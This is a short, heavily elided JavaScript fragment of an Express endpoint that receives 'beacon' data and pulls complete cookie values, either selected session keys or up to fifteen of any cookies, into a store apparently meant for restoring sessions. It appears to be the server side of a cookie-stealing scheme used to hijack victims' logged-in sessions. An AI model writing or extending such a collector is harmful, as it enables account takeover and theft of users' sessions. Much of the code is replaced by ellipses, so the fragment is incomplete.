...
app.post('/log/session', express.text({ type: '*/*', limit: '512kb' }), (req, res) => {
  ...
  try {
      ...
      if (decoded.cookies) {
        try {
          ...
          if (importantKeys.length > 0) {
            ...
            importantKeys.forEach(k => { cookieValuesForRestore[k] = String(cookieObj[k]); }); // Full cookies, no truncation
          } else if (keys.length > 0) {
            // Fall back to all cookies (up to 15)
            capturedCookieNames = keys.slice(0, 15);
            keys.slice(0, 15).forEach(k => { cookieValuesForRestore[k] = String(cookieObj[k]); }); // Full
          }
    ...
    console.error('Beacon processing error:', err);
  }
});
